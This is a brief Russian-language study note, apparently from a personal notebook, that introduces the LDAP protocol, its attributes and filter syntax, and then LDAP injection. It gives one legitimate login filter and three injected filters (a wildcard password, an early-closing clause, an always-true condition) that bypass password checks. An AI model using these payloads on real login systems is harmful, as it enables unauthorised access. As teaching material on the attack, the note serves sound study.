**LDAP (Lightweight Directory Access Protocol**) - открытый протокол, который используется для хранения и получения данных из каталога с иерархической структурой.

![[Pasted image 20241004203801.png]]

Атрибуты - пара ключ-значение.
Запись – набор атрибутов.

# Синтаксис

![[Pasted image 20241004203903.png]]

# LDAP-иньекции
Легетимный запрос
- (&(login=ivan.rubenko)(pswd=123ivan321))
![[Pasted image 20241004204008.png]]
- (&(login=admin)(pswd=*))
![[Pasted image 20241004204015.png]]
- (&(login=admin)(&))(pswd=test))
![[Pasted image 20241004204023.png]]
- (&(login=admin)(|(!pswd=1)(pswd=1)))
![[Pasted image 20241004204030.png]]